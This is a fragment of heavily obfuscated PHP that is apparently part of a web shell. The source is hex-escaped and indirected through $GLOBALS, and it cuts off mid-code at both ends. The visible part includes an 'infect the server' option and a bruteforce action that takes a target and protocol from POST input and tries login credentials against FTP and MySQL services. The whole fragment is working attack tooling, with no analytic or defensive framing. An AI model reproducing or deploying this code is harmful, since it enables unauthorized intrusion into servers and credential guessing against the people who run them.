\x74o\x20\x69\x6ef\x65ct \x74h\x65\x20s\x65r\x76\x65\x72?\x26n\x62\x73p\x3b\x3ca\x20\x68r\x65\x66\x3d\x23\x20on\x63\x6c\x69\x63\x6b=\x22g(\x6e\x75\x6c\x6c,n\x75ll,'i\x6ef\x65\x63t\x27)\x22>Ye\x73</\x61\x3e</d\x69\x76\x3e";}printFooter();}function actionBruteforce(){printHeader();if(isset($_POST["p\x72o\x74o"])){$etnhphnip="s\x75c\x63e\x73\x73";echo"\x3ch\x31>Resu\x6c\x74\x73</h\x31><\x64\x69\x76 c\x6c\x61ss=co\x6e\x74e\x6et\x3e<s\x70an\x3eTyp\x65:\x3c/sp\x61n\x3e\x20".htmlspecialchars($_POST["\x70\x72ot\x6f"])." \x3cs\x70\x61\x6e>S\x65\x72ve\x72:</\x73pa\x6e\x3e\x20".htmlspecialchars($_POST["serve\x72"])."<\x62\x72\x3e";if($_POST["p\x72oto"]=="\x66\x74\x70"){function bruteForce($ip,$port,$login,$pass){$sifimpghdo="\x70\x61\x73\x73";${"G\x4cO\x42A\x4cS"}["vcwirq\x6eci\x76"]="fp";${"\x47LO\x42ALS"}["d\x76\x74\x67\x67\x64r\x6e"]="f\x70";${${"\x47\x4cO\x42A\x4c\x53"}["\x64\x76\x74\x67g\x64r\x6e"]}=@ftp_connect(${${"\x47L\x4f\x42\x41\x4c\x53"}["\x70\x75gxd\x74\x70j\x6d"]},${${"\x47\x4c\x4f\x42\x41LS"}["\x72\x70\x6e\x72z\x6e\x6b\x77"]}?${${"\x47\x4c\x4fBAL\x53"}["\x72\x70\x6e\x72\x7a\x6e\x6b\x77"]}:21);$covdtwd="\x66\x70";if(!${${"G\x4cOB\x41\x4cS"}["\x76\x63\x77\x69\x72q\x6e\x63\x69v"]})return false;${${"\x47LOB\x41\x4c\x53"}["\x66\x7ac\x76\x78\x6c\x6e\x70"]}=@ftp_login(${$covdtwd},${${"\x47LO\x42A\x4cS"}["\x62\x77\x74bm\x74\x6cx\x69s\x68\x73"]},${$sifimpghdo});@ftp_close(${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["qr\x74t\x6f\x71\x74s"]});return${${"\x47\x4cO\x42\x41L\x53"}["\x66zc\x76\x78l\x6ep"]};}}elseif($_POST["pro\x74\x6f"]=="mys\x71l"){function bruteForce($ip,$port,$login,$pass){${"G\x4c\x4f\x42\x41\x4cS"}["\x76\x64fw\x78\x6f\x77\x73g\x65"]="po\x72t";${"\x47LO\x42\x41LS"}["\x62f\x68\x64\x78atg"]="pa\x73s";$jbfueogw="\x70or\x74";${"G\x4c\x4f\x42ALS"}["\x73g\x75\x79\x6aek\x79"]="r\x65\x73";${${"\x47\x4cO\x42\x41\x4cS"}["\x66z\x63\x76x\x6c\x6e\x70"]}=@mysql_connect(${${"\x47LO\x42\x41\x4cS"}["\x70\x75\x67\x78\x64\x74p\x6a\x6d"]}.":".${$jbfueogw}?${${"GLO\x42ALS"}["v\x64\x66